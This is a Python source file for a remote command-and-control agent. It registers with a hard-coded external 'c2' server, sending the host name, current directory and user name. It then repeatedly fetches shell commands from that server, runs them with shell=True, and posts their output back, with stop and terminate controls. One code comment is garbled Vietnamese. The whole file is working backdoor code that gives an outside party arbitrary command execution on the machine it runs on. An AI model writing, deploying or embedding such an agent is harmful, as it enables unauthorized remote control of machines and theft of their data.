import os
import time
import argparse
import requests
import subprocess
import signal
import threading

SERVER = os.getenv("CONTROL_SERVER", "https://c2-ghuy.onrender.com")
POLL_INTERVAL = 3
AGENT_ID = None
STOPPING = False
CURRENT_PROCESS = None
CURRENT_LOCK = threading.Lock()


def graceful_exit(signum, frame):
    global STOPPING
    STOPPING = True
    kill_current()


signal.signal(signal.SIGINT, graceful_exit)
signal.signal(signal.SIGTERM, graceful_exit)


def kill_current():
    global CURRENT_PROCESS
    with CURRENT_LOCK:
        if CURRENT_PROCESS:
            try:
                os.killpg(os.getpgid(CURRENT_PROCESS.pid), signal.SIGKILL)
            except Exception:
                try:
                    CURRENT_PROCESS.terminate()
                except Exception:
                    pass
            CURRENT_PROCESS = None


def register(agent_id, info):
    try:
        r = requests.post(f"{SERVER}/register", json={"agent_id": agent_id, "info": info}, timeout=10)
        return r.json()
    except Exception:
        return None


def get_task(agent_id):
    try:
        r = requests.get(f"{SERVER}/task", params={"agent": agent_id}, timeout=30)
        return r.json().get("cmd", None)
    except Exception:
        return None


def post_result(agent_id, cmd, result):
    try:
        requests.post(f"{SERVER}/task_result", json={
            "agent_id": agent_id, "cmd": cmd, "result": result
        }, timeout=10)
    except Exception:
        pass


def run_cmd_background(cmd, agent_id):
    global CURRENT_PROCESS
    try:
        with CURRENT_LOCK:
            CURRENT_PROCESS = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                preexec_fn=os.setsid  # Linux: new process group
            )
        stdout, stderr = CURRENT_PROCESS.communicate()
        code = CURRENT_PROCESS.returncode
        out = (stdout or "") + (stderr or "")
        post_result(agent_id, cmd, f"code={code}\n{out[:15000]}")
    except Exception as e:
        post_result(agent_id, cmd, f"error: {e}")
    finally:
        with CURRENT_LOCK:
            CURRENT_PROCESS = None


def main():
    global AGENT_ID
    parser = argparse.ArgumentParser()
    parser.add_argument("--id", required=False)
    parser.add_argument("--info", default="")
    args = parser.parse_args()
    AGENT_ID = args.id or os.uname().nodename or "agent-unknown"
    info = {"note": args.info, "cwd": os.getcwd(), "user": os.getenv("USER")}

    print("Registering to", SERVER)
    register(AGENT_ID, info)

    while not STOPPING:
        cmd = get_task(AGENT_ID)
        if cmd:
            if cmd == "__TERMINATE__":
                post_result(AGENT_ID, cmd, "terminated_by_control")
                break
            elif cmd == "__STOP__":
                kill_current()
                post_result(AGENT_ID, cmd, "stopped_current_task")
                continue

            # cháº¡y command á»Ÿ thread riÃªng Ä‘á»ƒ cÃ³ thá»ƒ kill giá»¯a chá»«ng
            t = threading.Thread(target=run_cmd_background, args=(cmd, AGENT_ID))
            t.daemon = True
            t.start()

        time.sleep(POLL_INTERVAL)

    kill_current()
    print("Agent exiting")


if __name__ == "__main__":
    main()